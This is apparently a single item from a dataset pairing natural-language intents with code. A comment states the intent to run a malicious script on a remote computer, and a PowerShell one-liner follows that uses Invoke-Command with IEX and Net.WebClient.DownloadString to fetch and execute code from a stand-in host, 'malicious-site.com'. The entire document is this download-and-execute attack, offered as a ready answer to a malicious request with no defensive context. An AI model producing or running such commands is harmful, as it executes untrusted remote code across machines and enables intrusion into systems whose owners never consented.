# Natural language intent:
# Invokes a command on a remote computer to download and execute a malicious script from a specified URL.

Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-code')}
